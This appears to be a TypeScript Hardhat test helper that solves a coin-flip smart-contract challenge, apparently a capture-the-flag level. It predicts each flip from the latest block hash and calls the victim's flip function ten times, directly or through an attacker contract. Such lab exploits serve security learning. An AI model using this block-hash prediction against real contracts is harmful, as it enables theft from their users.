import { ethers } from "hardhat";

const GUESS_COUNT = 10;

const FACTOR = ethers.BigNumber.from(
  "57896044618658097711785492504343953926634992332820282019728792003956564819968"
);

export const helper = async (victim: any, _: any) => {
  for (let index = 0; index < GUESS_COUNT; index++) {
    const { hash } = await ethers.provider.getBlock("latest");

    const blockValue = ethers.BigNumber.from(hash).div(FACTOR);
    const guess = blockValue.toString() === "1";
    await victim.flip(guess);
  }
};

export const helperWithContract = async (_: any, attacker: any) => {
  for (let index = 0; index < GUESS_COUNT; index++) {
    await attacker.hackContract();
  }
};
